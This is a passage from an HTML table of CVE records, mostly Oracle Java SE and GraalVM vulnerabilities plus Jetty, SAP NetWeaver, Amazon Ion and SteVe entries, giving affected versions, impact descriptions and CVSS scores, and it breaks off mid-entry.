		<td valign="top">Jetty is a Java based web server and servlet engine. An HTTP/2 SSL connection that is established and TCP congested will be leaked when it times out. An attacker can cause many connections to end up in this state, and the server may run out of file descriptors, eventually causing the server to stop accepting new connections from valid clients. The vulnerability is patched in 9.4.54, 10.0.20, 11.0.20, and 12.0.6.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-22127">CVE-2024-22127</a></td>
		<td valign="top">SAP NetWeaver Administrator AS Java (Administrator Log Viewer plug-in) - version 7.50, allows an attacker with high privileges to upload potentially dangerous files which leads to command injection vulnerability. This would enable the attacker to run commands which can cause high impact on confidentiality, integrity and availability of the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-22126">CVE-2024-22126</a></td>
		<td valign="top">The User Admin application of SAP NetWeaver AS for Java - version 7.50, insufficiently validates and improperly encodes the incoming URL parameters before including them into the redirect URL. This results in Cross-Site Scripting (XSS) vulnerability, leading to a high impact on confidentiality and mild impact on integrity and availability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21634">CVE-2024-21634</a></td>
		<td valign="top">Amazon Ion is a Java implementation of the Ion data notation. Prior to version 1.10.5, a potential denial-of-service issue exists in `ion-java` for applications that use `ion-java` to deserialize Ion text encoded data, or deserialize Ion text or binary encoded data into the `IonValue` model and then invoke certain `IonValue` methods on that in-memory representation. An actor could craft Ion data that, when loaded by the affected application and/or processed using the `IonValue` model, results in a `StackOverflowError` originating from the `ion-java` library. The patch is included in `ion-java` 1.10.5. As a workaround, do not load data which originated from an untrusted source or that could have been tampered with.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21550">CVE-2024-21550</a></td>
		<td valign="top">SteVe is an open platform that implements different version of the OCPP protocol for Electric Vehicle charge points, acting as a central server for management of registered charge points. Attackers can inject arbitrary HTML and Javascript code via WebSockets leading to persistent Cross-Site Scripting in the SteVe management interface.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21174">CVE-2024-21174</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 19.3-19.23, 21.3-21.14 and 23.4. Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java VM. CVSS 3.1 Base Score 3.1 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21147">CVE-2024-21147</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and 21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21145">CVE-2024-21145</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D). Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and 21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21144">CVE-2024-21144</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Concurrency). Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23; Oracle GraalVM Enterprise Edition: 20.3.14 and 21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21140">CVE-2024-21140</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and 21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21138">CVE-2024-21138</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and 21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21131">CVE-2024-21131</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and 21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21098">CVE-2024-21098</a></td>
		<td valign="top">Vulnerability in the Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Compiler). Supported versions that are affected are Oracle GraalVM for JDK: 17.0.10, 21.0.2, 22; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21094">CVE-2024-21094</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u401, 8u401-perf, 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2, 22; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21093">CVE-2024-21093</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 19.3-19.22 and 21.3-21.13. Difficult to exploit vulnerability allows low privileged attacker having Create Session, Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java VM accessible data. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21085">CVE-2024-21085</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Concurrency). Supported versions that are affected are Oracle Java SE: 8u401, 8u401-perf, 11.0.22; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21068">CVE-2024-21068</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u401-perf, 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2 and 22; Oracle GraalVM Enterprise Edition: 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21012">CVE-2024-21012</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Networking). Supported versions that are affected are Oracle Java SE: 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2, 22; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21011">CVE-2024-21011</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 8u401, 8u401-perf, 11.0.22, 17.0.10, 21.0.2, 22; Oracle GraalVM for JDK: 17.0.10, 21.0.2, 22; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21005">CVE-2024-21005</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JavaFX). Supported versions that are affected are Oracle Java SE: 8u401; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21004">CVE-2024-21004</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JavaFX). Supported versions that are affected are Oracle Java SE: 8u401; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where Oracle Java SE, Oracle GraalVM Enterprise Edition executes to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 2.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21003">CVE-2024-21003</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JavaFX). Supported versions that are affected are Oracle Java SE: 8u401; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 3.1 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-21002">CVE-2024-21002</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JavaFX). Supported versions that are affected are Oracle Java SE: 8u401; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where Oracle Java SE, Oracle GraalVM Enterprise Edition executes to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 2.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20955">CVE-2024-20955</a></td>
		<td valign="top">Vulnerability in the Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Compiler). Supported versions that are affected are Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and 22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20954">CVE-2024-20954</a></td>
		<td valign="top">Vulnerability in the Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Compiler). Supported versions that are affected are Oracle GraalVM for JDK: 17.0.10, 21.0.2, 22; Oracle GraalVM Enterprise Edition: 20.3.13 and 21.3.9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20952">CVE-2024-20952</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security). Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and 22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20945">CVE-2024-20945</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security). Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and 22.3.4. Difficult to exploit vulnerability allows low privileged attacker with logon to the infrastructure where Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition executes to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20932">CVE-2024-20932</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security). Supported versions that are affected are Oracle Java SE: 17.0.9; Oracle GraalVM for JDK: 17.0.9; Oracle GraalVM Enterprise Edition: 21.3.8 and 22.3.4. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-20926">CVE-2024-20926</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Scripting). Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21; Oracle GraalVM for JDK: 17.0.9; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and 22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 